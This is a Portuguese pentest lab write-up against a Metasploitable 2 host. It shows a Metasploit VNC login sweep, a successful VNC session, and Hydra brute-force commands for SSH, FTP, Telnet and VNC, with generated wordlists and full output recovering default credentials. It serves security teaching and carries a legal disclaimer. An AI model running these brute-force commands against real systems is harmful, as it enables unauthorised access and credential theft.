[*] 192.168.100.11:5900   - 192.168.100.11:5900 - Starting VNC login sweep
[!] 192.168.100.11:5900   - No active DB -- Credential data will not be saved!
[+] 192.168.100.11:5900   - 192.168.100.11:5900 - Login Successful: :password  #<------->
[*] 192.168.100.11:5900   - Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
msf6 auxiliary(scanner/vnc/vnc_login) > 
```
Simples assim como a vida tenque ser...
testando...

```
vncviewer 192.168.100.11 

Connected to RFB server, using protocol version 3.3
Performing standard VNC authentication
Password: 
Authentication successful
Desktop name "root's X desktop (metasploitable:0)"
VNC server default format:
  32 bits per pixel.
  Least significant byte first in each pixel.
  True colour: max red 255 green 255 blue 255, shift red 16 green 8 blue 0
Using default colormap which is TrueColor.  Pixel format:
  32 bits per pixel.
  Least significant byte first in each pixel.
  True colour: max red 255 green 255 blue 255, shift red 16 green 8 blue 0
┌──(kali㉿kali)-[~/t2/etc/cron.d]
└─$ 
```                                                       

## 5. Hydra - Brute force

Aproveitando o embalo do brute force do vnc...

### Ataques com Hydra: Telnet e VNC (Pentest em Metasploitable 2)


Hydra é uma ferramenta de força bruta rápida e flexível usada para quebrar senhas de serviços de rede, como SSH, FTP, Telnet, HTTP, VNC, entre outros. Ela tenta combinações de usuários e senhas automaticamente até encontrar credenciais válidas. Ideal para testes de intrusão em ambientes autorizados.

Exemplos: 

1. Lista de Usuários e senhas 
```
hydra -L users.txt -P passwords.txt 192.168.100.20 ssh
```
- Tenta todas as combinações entre os usuários em users.txt e senhas em passwords.txt.

2. Usuário fixo, senhas de wordlist
```
hydra -l admin -P rockyou.txt 192.168.100.20 ftp
```
- Tenta o usuário "admin" com todas as senhas do arquivo rockyou.txt.

3. Lista de Usuários, senha fixa
```
hydra -L users.txt -p 123456 192.168.100.20 telnet
```
- Usa todos os usuários da lista com a senha "123456".

4. Usuário e senha iguais (modo par linha a linha)
```
hydra -C combos.txt 192.168.100.20 ssh
```
- O arquivo combos.txt deve ter pares do tipo: usuario:senha
  Exemplo:
    admin:admin
    user1:123456
    guest:guest

5. Ataque contra VNC (sem usuário, só senha)
```
hydra -P senhas.txt 192.168.100.20 vnc
```
- O VNC padrão exige apenas senha (sem login), ideal para testes diretos.

6. Gerar senhas com pwgen e usar no Hydra (stdin)
Comando:
```
pwgen -1 8 100 | hydra -l admin -P - 192.168.100.20 ssh
```
Descrição:
- Gera 100 senhas aleatórias com 8 caracteres
- Envia direto para o Hydra com a opção -P -

7. Gerar senhas com crunch (combinatório)
Comando:
```
crunch 6 6 abc123 | hydra -l admin -P - 192.168.100.20 ftp
```
Descrição:
- Gera senhas de 6 caracteres usando apenas os caracteres a, b, c, 1, 2, 3
- Usa diretamente no Hydra

Dica:
Instalar o crunch, se necessário:
sudo apt install crunch

8. Gerar senhas aleatórias com Bash e urandom
Comando:
```
for i in {1..100}; do echo $(head /dev/urandom | tr -dc A-Za-z0-9 | head -c8); done | hydra -l admin -P - 192.168.100.20 ssh
```

Descrição:
- Gera 100 senhas randômicas com 8 caracteres alfanuméricos
- Envia direto ao Hydra sem criar arquivo


---

###  Requisitos

- Kali Linux (ou similar)
- Ferramenta `hydra` instalada (vem por padrão no Kali)
- IP da vítima (exemplo: `192.168.100.20`)
- Serviços ativos na vítima:
  - Telnet (porta 23)
  - VNC (porta 5900)
- Wordlists - https://github.com/kkrypt0nn/wordlists
---

### Ataque Telnet com Hydra

### Alvo

- Serviço: Telnet
- Porta: 23
- Usuário padrão: `msfadmin`
- Wordlist - senhas.txt (gerei na mao :D)

### Comando Hydra:

```bash
hydra -l msfadmin -P senhas.txt 192.168.100.11 telnet
```

### Ataque VNC com Hydra

### Alvo

- Serviço: VNC
- Porta: 23
- Wordlist - senhas.txt (gerei na mao :D)

### Comando Hydra:

```bash
hydra -P senhas.txt 192.168.100.11 vnc
```


Bora executar....

```          
┌──(kali㉿kali)-[~]
└─$ hydra -l msfadmin -P senhas  192.168.100.11 telnet
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-06-04 14:32:57
[WARNING] telnet is by its nature unreliable to analyze, if possible better choose FTP, SSH, etc. if available
[WARNING] Restorefile (you have 10 seconds to abort... (use option -I to skip waiting)) from a previous session found, to prevent overwriting, ./hydra.restore

[DATA] max 6 tasks per 1 server, overall 6 tasks, 6 login tries (l:1/p:6), ~1 try per task
[DATA] attacking telnet://192.168.100.11:23/
[23][telnet] host: 192.168.100.11   login: msfadmin   password: msfadmin #<-------
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-06-04 14:33:10
                                                                                                                                
┌──(kali㉿kali)-[~]
└─$ 
                                                                                                                                
┌──(kali㉿kali)-[~]
└─$ hydra -l msfadmin -P senhas  192.168.100.11 vnc   
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-06-04 14:33:24
[WARNING] you should set the number of parallel task to 4 for vnc services.
[ERROR] The redis, adam6500, cisco, oracle-listener, s7-300, snmp and vnc modules are only using the -p or -P option, not login (-l, -L) or colon file (-C).
Use the telnet module for cisco using "Username:" authentication.

                                                                                                                                
┌──(kali㉿kali)-[~]
└─$ hydra  -P senhas  192.168.100.11 vnc 
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-06-04 14:33:40
[WARNING] you should set the number of parallel task to 4 for vnc services.
[DATA] max 6 tasks per 1 server, overall 6 tasks, 6 login tries (l:1/p:6), ~1 try per task
[DATA] attacking vnc://192.168.100.11:5900/
[ERROR] unknown VNC server security result 2
[5900][vnc] host: 192.168.100.11   password: password
1 of 1 target successfully completed, 1 valid password found #<-------
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-06-04 14:33:41
                                                                                                                                
┌──(kali㉿kali)-[~]
└─$ 
```


---

## ✅ Conclusão

- Cada falha explorada nesta aula tem base em vulnerabilidades reais e documentadas
- A importância da atualização de sistemas, controle de acesso e segmentação de serviços
- A ética e responsabilidade no uso de ferramentas de segurança ofensiva são tão importantes quanto o conhecimento técnico

---
<div align="center">

⚠️ Aviso Legal

Este conteúdo é fornecido apenas para fins educacionais.<br> Realizar força bruta ou qualquer tipo de acesso não autorizado a sistemas sem permissão constitui crime.<br> Use somente em ambientes controlados e autorizados, como laboratórios e CTFs.
</div>